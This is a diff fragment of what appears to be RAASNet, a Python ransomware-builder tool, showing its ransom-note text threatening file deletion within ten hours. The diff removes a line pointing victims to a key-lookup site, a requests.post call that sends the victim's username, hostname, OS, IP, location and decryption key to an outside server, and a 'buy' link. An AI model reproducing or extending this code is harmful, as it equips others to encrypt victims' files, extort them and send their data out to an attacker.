@@ -293,12 +293,6 @@ Your files will be deleted when the timer runs out, so you better hurry.
 You have 10 hours to find your key
 
 C'mon, be glad I don't ask for payment like other ransomware.
-
-Please visit: https://keys.zeznzo.nl and search for your IP/hostname to get your key.
-
-Kind regards,
-
-Zeznzo
 ''')
         self.options['img_base64'].set('''iVBORw0KGgoAAAANSUhEUgAAAlgAAAIOCAMAAABTb4MEAAAAY1BMVEVHcEy/v79/f39QUFBAQEAg
 ICAAAAAQEBCfn5/f39/v7+9gYGCvr68/NwB/bQBPRAAgGwDPz88wMDCOewDOsQD92gDtzACulgBv
@@ -1134,11 +1128,6 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
                             else:
                                 co = self.serv.options['other']['text'] + 1
                                 self.serv.options['other']['text'] = co
-
-
-                            #if save_keys == 1:
-                            payload = {'user' : self.options['username'].get(), 'pwd' : self.options['password'].get(), 'Occured': time.strftime('%d/%m/%Y') + ' ' + time.strftime('%X'), 'Username' : user, 'OS' : system, 'Hostname' : hostname, 'Key' : key, 'IP' : ip, 'LocalIP' : local, 'Continent' : con, 'Country' : country, 'lat' : lat, 'lon' : lon}
-                            r = requests.post('https://zeznzo.nl/post.py', data=payload)
                         else:
                             break
 
@@ -1219,9 +1208,6 @@ vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC''')
 
     def open_github(self):
         webbrowser.open_new_tab('https://www.github.com/leonv024/RAASNet')
-
-    def open_buy(self):
-        webbrowser.open_new_tab('https://www.zeznzo.nl/')
 
     def exit(self):
         sys.exit(0)
